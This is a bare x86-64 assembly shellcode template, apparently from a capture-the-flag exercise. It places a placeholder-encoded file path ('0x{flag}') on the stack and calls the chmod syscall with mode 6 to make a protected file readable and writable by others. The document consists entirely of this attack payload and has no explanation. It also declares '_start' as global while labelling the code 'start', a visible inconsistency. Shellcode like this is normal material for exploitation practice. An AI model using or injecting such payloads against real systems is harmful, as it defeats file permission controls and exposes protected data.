.intel_syntax noprefix
.global _start

.section .text
start:
    push 0x{flag}
    push rsp
    pop rdi

    push 6
    pop rsi

    push 0x5a
    pop rax
    syscall
